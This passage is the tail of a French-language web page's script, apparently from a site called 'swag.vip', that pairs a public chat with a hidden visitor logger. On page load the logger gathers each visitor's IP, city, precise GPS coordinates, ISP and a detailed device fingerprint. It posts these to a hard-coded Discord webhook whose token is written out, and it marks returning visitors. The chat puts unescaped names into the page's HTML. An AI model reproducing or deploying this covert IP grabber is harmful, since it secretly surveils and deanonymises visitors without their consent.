                if (dbg) gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
            }
        } catch(e) {}

        var connType = 'N/A';
        var connDown = 'N/A';
        var connUp = 'N/A';
        try {
            var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            if (conn) {
                connType = conn.effectiveType || conn.type || 'N/A';
                connDown = conn.downlink ? conn.downlink + ' Mbps' : 'N/A';
                connUp = conn.rtt ? conn.rtt + ' ms (latence)' : 'N/A';
            }
        } catch(e) {}

        var batteryLevel = 'N/A';
        var charging = 'N/A';
        var batteryPromise = navigator.getBattery ? navigator.getBattery() : null;

        var perfData = 'N/A';
        try {
            var p = performance.timing;
            var loadTime = p.loadEventEnd - p.navigationStart;
            if (loadTime > 0) perfData = loadTime + ' ms';
        } catch(e) {}

        function sendWebhook(extraFields) {
            var now = new Date();
            var date = now.toLocaleDateString('fr-FR');
            var heure = now.toLocaleTimeString('fr-FR');
            var webhookUrl = 'https://ptb.discord.com/api/webhooks/1530049010847449219/El-pK11mF902pbR4TJAOKWLtqHdHbZRFOs9TBKpr2ao6kjVF-cJZVSVGGEZ4taBA1bAV';

            var seenIPs = JSON.parse(localStorage.getItem('seenIPs') || '[]');
            var isReturning = seenIPs.indexOf(ip) !== -1;

            if (isReturning) {
                fetch(webhookUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        embeds: [{
                            title: visitorPseudo + ' est revenu',
                            description: '**' + visitorPseudo + '** a revisite la page.',
                            color: 2894892,
                            thumbnail: { url: getWebhookAvatar() },
                            fields: [
                                { name: 'IP', value: '||`' + ip + '`||', inline: true },
                                { name: 'Date', value: date + ' ' + heure, inline: true },
                                { name: 'Ville', value: (geo.city || 'N/A') + ', ' + (geo.country || 'N/A'), inline: true }
                            ],
                            footer: { text: 'swag.vip' }
                        }]
                    })
                });
                return;
            }

            seenIPs.push(ip);
            localStorage.setItem('seenIPs', JSON.stringify(seenIPs));

            var embed1 = {
                title: visitorPseudo,
                color: 2894892,
                thumbnail: { url: getWebhookAvatar() },
                fields: [
                    { name: 'IP', value: '||`' + ip + '`||', inline: true },
                    { name: 'Date', value: date + ' ' + heure, inline: true },
                    { name: 'Pays', value: (geo.country || 'N/A') + ' ' + (geo.countryCode ? ':' + geo.countryCode.toLowerCase() + ':' : ''), inline: true },
                    { name: 'Region', value: (geo.regionName || 'N/A') + ' (' + (geo.region || '') + ')', inline: true },
                    { name: 'Ville', value: geo.city || 'N/A', inline: true },
                    { name: 'Postal', value: geo.zip || 'N/A', inline: true },
                    { name: 'GPS', value: '||`' + (geo.lat || 'N/A') + ', ' + (geo.lon || 'N/A') + '`||', inline: true },
                    { name: 'Timezone', value: geo.timezone || 'N/A', inline: true },
                    { name: 'Google Maps', value: (geo.lat && geo.lon) ? '[Ouvrir](https://www.google.com/maps?q=' + geo.lat + ',' + geo.lon + ')' : 'N/A', inline: true }
                ],
                footer: { text: 'swag.vip' }
            };

            var embed2 = {
                title: 'Reseau',
                color: 2894892,
                fields: [
                    { name: 'ISP', value: (geo.isp || 'N/A').substring(0, 100), inline: false },
                    { name: 'Organisation', value: (geo.org || 'N/A').substring(0, 100), inline: false },
                    { name: 'AS', value: (geo.as || 'N/A').substring(0, 100), inline: false },
                    { name: 'Reverse DNS', value: '`' + (geo.reverse || 'N/A') + '`', inline: false },
                    { name: 'Mobile', value: geo.mobile ? 'Oui' : 'Non', inline: true },
                    { name: 'Proxy/VPN', value: geo.proxy ? 'Oui' : 'Non', inline: true },
                    { name: 'Hosting', value: geo.hosting ? 'Oui' : 'Non', inline: true },
                    { name: 'Conn', value: connType, inline: true },
                    { name: 'DL Speed', value: connDown, inline: true },
                    { name: 'Latence', value: connUp, inline: true }
                ]
            };

            var embed3 = {
                title: 'Appareil',
                color: 2894892,
                fields: [
                    { name: 'Navigateur', value: browser, inline: true },
                    { name: 'OS', value: os, inline: true },
                    { name: 'Device', value: device, inline: true },
                    { name: 'Platform', value: platform, inline: true },
                    { name: 'CPU', value: cpuCores + ' cores', inline: true },
                    { name: 'RAM', value: ram, inline: true },
                    { name: 'GPU', value: '`' + gpu.substring(0, 80) + '`', inline: false },
                    { name: 'Screen', value: screenRes + ' @' + pixelRatio + 'x (' + colorDepth + ')', inline: true },
                    { name: 'Batterie', value: batteryLevel + (charging !== 'N/A' ? (charging ? ' :green_circle:' : ' :red_circle:') : ''), inline: true },
                    { name: 'Touch', value: touch, inline: true },
                    { name: 'Cookies', value: cookies, inline: true },
                    { name: 'DNT', value: doNotTrack, inline: true },
                    { name: 'Langue', value: lang, inline: true },
                    { name: 'Referrer', value: referrer, inline: false }
                ]
            };

            if (gpsCoords) {
                embed1.fields.push({ name: 'GPS Precis', value: '||`' + gpsCoords.lat + ', ' + gpsCoords.lon + '`||', inline: true });
                embed1.fields.push({ name: 'Precision', value: gpsCoords.accuracy + ' m', inline: true });
            }

            if (extraFields) embed1.fields = embed1.fields.concat(extraFields);

            fetch(webhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ embeds: [embed1, embed2, embed3] })
            });
        }

        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(function(pos) {
                gpsCoords = {
                    lat: pos.coords.latitude.toFixed(6),
                    lon: pos.coords.longitude.toFixed(6),
                    accuracy: Math.round(pos.coords.accuracy)
                };
            }, function() {}, { enableHighAccuracy: true, timeout: 5000 });
        }

        fetch('https://api.ipify.org?format=json')
            .then(function(r) { return r.json(); })
            .then(function(ipData) {
                ip = ipData.ip;
                return fetch('https://ipapi.co/' + ip + '/json/');
            })
            .then(function(r) { return r.json(); })
            .then(function(geoData) {
                geo = {
                    country: geoData.country_name || 'N/A',
                    countryCode: geoData.country_code || '',
                    regionName: geoData.region || 'N/A',
                    region: geoData.region_code || '',
                    city: geoData.city || 'N/A',
                    zip: geoData.postal || 'N/A',
                    lat: geoData.latitude || 'N/A',
                    lon: geoData.longitude || 'N/A',
                    timezone: geoData.timezone || 'N/A',
                    isp: geoData.org || 'N/A',
                    org: geoData.org || 'N/A',
                    as: 'N/A',
                    reverse: 'N/A',
                    mobile: false,
                    proxy: false,
                    hosting: false
                };

                if (batteryPromise) {
                    batteryPromise.then(function(b) {
                        batteryLevel = Math.round(b.level * 100) + '%';
                        charging = b.charging;
                        sendWebhook();
                    }).catch(function() { sendWebhook(); });
                } else {
                    sendWebhook();
                }
            })
            .catch(function() {
                geo = {};
                sendWebhook([{ name: 'Status', value: 'IP non disponible', inline: false }]);
            });
        }

        if (visitorPseudo) initLogger();

        // CHAT PUBLIC
        var CHAT_DB = 'https://swag-chat-cf93e-default-rtdb.firebaseio.com';
        var chatSent = false;

        function toggleChat() {
            var open = document.getElementById('chatPanel').style.display === 'flex';
            document.getElementById('chatPanel').style.display = open ? 'none' : 'flex';
            document.getElementById('chatOverlay').style.display = open ? 'none' : 'block';
            if (!open) {
                if (localStorage.getItem('chatSent_' + ip) === '1') {
                    document.getElementById('chatInputArea').style.display = 'none';
                    document.getElementById('chatSentNotice').style.display = 'block';
                }
                loadChat();
            }
        }

        function loadChat() {
            var container = document.getElementById('chatMessages');
            container.innerHTML = '<div class="chat-sent-notice">Chargement...</div>';
            fetch(CHAT_DB + '/chat.json')
                .then(function(r) { return r.json(); })
                .then(function(data) {
                    container.innerHTML = '';
                    if (!data) { container.innerHTML = '<div class="chat-sent-notice">Aucun message pour le moment.</div>'; return; }
                    var keys = Object.keys(data).sort();
                    for (var i = 0; i < keys.length; i++) {
                        var m = data[keys[i]];
                        var time = m.time ? new Date(m.time) : new Date();
                        var timeStr = time.toLocaleTimeString('fr-FR', { hour: '2-digit', minute: '2-digit' });
                        container.innerHTML += '<div class="chat-msg">' +
                            '<img class="chat-msg-avatar" src="' + (m.avatar || DEFAULT_AVATAR) + '" alt="">' +
                            '<div class="chat-msg-content">' +
                            '<div class="chat-msg-name">' + (m.pseudo || 'Anonyme') + '</div>' +
                            '<div class="chat-msg-text">' + escapeHtml(m.text || '') + '</div>' +
                            '<div class="chat-msg-time">' + timeStr + '</div>' +
                            '</div></div>';
                    }
                    container.scrollTop = container.scrollHeight;
                })
                .catch(function(e) {
                    container.innerHTML = '<div class="chat-sent-notice">Erreur de connexion au chat.</div>';
                });
        }

        function escapeHtml(t) {
            var d = document.createElement('div');
            d.textContent = t;
            return d.innerHTML;
        }

        function sendChatMessage() {
            var chatKey = 'chatSent_' + ip;
            if (localStorage.getItem(chatKey) === '1') return;
            var input = document.getElementById('chatInput');
            var text = input.value.trim();
            if (!text) return;

            chatSent = true;
            localStorage.setItem('chatSent_' + ip, '1');
            input.value = '';
            document.getElementById('chatInputArea').style.display = 'none';
            document.getElementById('chatSentNotice').style.display = 'block';

            fetch(CHAT_DB + '/chat.json', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    pseudo: visitorPseudo || 'Anonyme',
                    avatar: getAvatar(),
                    text: text,
                    time: Date.now()
                })
            }).then(function() { loadChat(); });
        }

        document.getElementById('chatInput').addEventListener('keydown', function(e) {
            if (e.key === 'Enter') sendChatMessage();
        });

        if (visitorPseudo) {
            document.getElementById('chatToggle').style.display = 'flex';
        }
    </script>
</body>
</html>
